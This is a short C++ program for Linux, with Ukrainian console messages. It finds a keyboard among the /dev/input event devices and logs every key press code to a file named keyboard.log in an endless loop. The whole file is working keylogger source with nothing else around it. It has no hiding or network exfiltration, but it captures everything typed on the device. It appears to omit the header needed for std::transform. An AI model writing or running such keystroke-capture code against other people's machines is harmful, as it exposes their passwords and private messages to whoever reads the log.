#include <iostream>
#include <fstream>
#include <string>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/ioctl.h>
#include <cstring>
#include <vector>

const std::string DEV_INPUT_PATH = "/dev/input/";
const int MAX_EVENTS = 32;
const std::string LOG_FILE = "keyboard.log";

bool isLikelyKeyboard(const std::string &name) {
    std::string lowerName = name;
    std::transform(lowerName.begin(), lowerName.end(), lowerName.begin(), ::tolower);
    return lowerName.find("kbd") != std::string::npos ||
           lowerName.find("keyboard") != std::string::npos ||
           lowerName.find("input") != std::string::npos;
}

std::string findKeyboardDevice() {
    for (int i = 0; i < MAX_EVENTS; ++i) {
        std::string devicePath = DEV_INPUT_PATH + "event" + std::to_string(i);
        int fd = open(devicePath.c_str(), O_RDONLY | O_NONBLOCK);
        if (fd < 0) continue;

        char name[256] = "Unknown";
        if (ioctl(fd, EVIOCGNAME(sizeof(name)), name) < 0) {
            close(fd);
            continue;
        }

        std::cout << "Перевіряю: " << devicePath << " — \"" << name << "\"" << std::endl;

        if (isLikelyKeyboard(name)) {
            close(fd);
            return devicePath;
        }

        close(fd);
    }

    return "";
}

int main() {
    std::string keyboardDevice = findKeyboardDevice();
    if (keyboardDevice.empty()) {
        std::cerr << "❌ Клавіатуру не знайдено!" << std::endl;
        return 1;
    }

    std::cout << "✅ Знайдено клавіатуру: " << keyboardDevice << std::endl;

    int fd = open(keyboardDevice.c_str(), O_RDONLY);
    if (fd < 0) {
        std::cerr << "❌ Не вдалося відкрити пристрій!" << std::endl;
        return 1;
    }

    std::ofstream logFile(LOG_FILE, std::ios::app);
    if (!logFile.is_open()) {
        std::cerr << "❌ Не вдалося відкрити лог-файл!" << std::endl;
        close(fd);
        return 1;
    }

    struct input_event ev;
    while (true) {
        ssize_t bytes = read(fd, &ev, sizeof(ev));
        if (bytes == sizeof(ev) && ev.type == EV_KEY && ev.value == 1) {
            std::cout << "Код клавіші: " << ev.code << std::endl;
            logFile << "Код клавіші: " << ev.code << std::endl;
        }
    }

    close(fd);
    return 0;
}
